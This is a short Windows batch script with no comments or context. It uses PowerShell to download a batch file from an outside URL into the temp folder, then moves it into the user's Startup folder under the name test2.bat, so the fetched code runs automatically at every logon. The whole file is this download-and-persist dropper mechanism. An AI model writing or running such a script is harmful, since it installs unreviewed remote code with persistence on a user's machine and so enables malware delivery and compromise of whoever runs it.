@echo off
setlocal

set "url=https://kappa.lol/e6jmfg"
set "dest=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test2.bat"

set "tempfile=%TEMP%\downloaded_file.bat"

powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%tempfile%')"

move /Y "%tempfile%" "%dest%"
